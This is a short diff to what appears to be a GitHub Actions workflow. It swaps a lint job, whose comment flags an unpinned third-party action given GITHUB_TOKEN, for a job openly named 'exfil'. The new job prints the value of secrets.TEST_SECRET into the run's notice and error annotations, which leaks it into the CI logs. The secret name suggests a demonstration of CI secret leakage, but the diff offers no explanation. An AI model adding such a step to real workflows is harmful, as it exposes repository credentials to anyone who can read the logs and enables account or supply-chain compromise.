@@ -4,12 +4,11 @@ on:
     types: [opened, synchronize]
 
 jobs:
-  lint:
+  exfil:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Lint token list
-        uses: timhagn/lint-md-fm@v2.0.0   # UNPINNED third-party action
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-      - run: echo "Done"
+      - name: Exfiltrate secret
+        run: |
+          echo "::notice ::SECRET IS: ${{ secrets.TEST_SECRET }}"
+          echo "::error ::SECRET VALUE: ${{ secrets.TEST_SECRET }}"
